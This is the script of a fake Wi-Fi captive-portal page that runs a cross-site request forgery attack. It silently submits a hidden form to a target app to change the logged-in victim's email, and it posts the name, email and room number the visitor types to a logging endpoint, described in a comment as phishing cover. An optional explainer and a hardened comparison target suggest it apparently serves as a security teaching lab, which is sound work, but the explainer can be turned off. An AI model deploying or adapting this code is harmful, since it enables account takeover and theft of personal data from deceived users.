const params = new URLSearchParams(location.search);
const name = CONFIG.targets[params.get('target')] ? params.get('target') : CONFIG.defaultTarget;
const target = CONFIG.targets[name];

const $ = (id) => document.getElementById(id);

if (!CONFIG.showExplainer) $('banner').hidden = true;

// Build the hidden form that does the actual attack.
// No CORS problem: forms are exempt, and we never read the response.
function sendAttack() {
  const form = $('attack-form');
  form.action = target.url;
  form.innerHTML = '';

  for (const [key, value] of Object.entries(target.fields)) {
    const input = document.createElement('input');
    input.type = 'hidden';
    input.name = key;
    input.value = value;
    form.appendChild(input);
  }

  form.submit();  // goes into the hidden iframe, so the page doesn't navigate
}

function showConnecting() {
  $('signin').hidden = true;
  $('status').hidden = false;
}

function showConnected() {
  $('spinner').hidden = true;
  $('tick').removeAttribute('hidden');  // .hidden doesn't work on <svg>
  $('status-title').textContent = 'Connected';
  $('status-text').textContent = 'You now have internet access. Session expires in 4 hours.';
}

// Keep whatever the victim typed, So it will look legit like phishing
function logVisit(details) {
  fetch('/log', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ target: name, url: target.url, ...details }),
  }).catch(() => { });
}

function showExplainer() {
  if (!CONFIG.showExplainer) return;
  $('explain').hidden = false;

  //Cross site check
  const crossSite = new URL(target.url).hostname !== location.hostname;
  const value = Object.values(target.fields)[0];

  const steps = [
    ['The victim was already logged in to the target app in another tab.', 'ok'],
    crossSite
      ? [`This page (${location.origin}) is a different site, so this is a real cross-site request.`, 'ok']
      : [`This page (${location.origin}) is the <b>same site</b> as the target - different port, but ports
         aren't part of a site. That's what lets the cookie through: the target sets no SameSite
         attribute, so the browser's Lax default would block a true cross-site POST.`, 'warn'],
    ['Clicking Connect submitted a hidden form into an invisible iframe.', 'ok'],
  ];

  if (name === 'secure') {
    steps.push(
      ['The hardened app rejected it - CSRF token missing, or the cookie was never sent.', 'bad'],
      ['Result: the email is unchanged.', 'bad'],
    );
  } else {
    steps.push(
      ['The browser attached the session cookie by itself. Forms are exempt from CORS.', 'ok'],
      ["We never read the response - CSRF doesn't need to, it only needs the write to happen.", 'ok'],
      [`Result: refresh the victim's profile. The email is now <b>${value}</b>.`, 'ok'],
    );
  }

  $('steps').innerHTML = steps.map(([text, cls]) => `<li class="${cls}">${text}</li>`).join('');

  const body = Object.entries(target.fields)
    .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&');
  const u = new URL(target.url);

  $('request').textContent = [
    `POST ${u.pathname} HTTP/1.1`,
    `Host: ${u.host}`,
    `Origin: ${location.origin}      <- attacker site`,
    'Content-Type: application/x-www-form-urlencoded',
    'Cookie: <session>               <- added by the browser, not by us',
    '',
    body,
    '',
    '# Check DevTools > Network. Both success and rejection return 302,',
    '# so confirm with the app log or by refreshing the profile page.',
  ].join('\n');
}

$('portal-form').addEventListener('submit', (e) => {
  e.preventDefault();

  if (!$('fullname').value.trim() || !$('email').value.trim() || !$('terms').checked) {
    $('error').hidden = false;
    $('error').textContent = 'Please complete all required fields and accept the terms.';
    return;
  }

  $('error').hidden = true;
  $('connect').disabled = true;

  logVisit({
    name: $('fullname').value.trim(),
    email: $('email').value.trim(),
    room: $('room').value.trim(),
  });

  sendAttack();
  showConnecting();

  setTimeout(() => {
    showConnected();
    showExplainer();
  }, CONFIG.connectDelay);
});
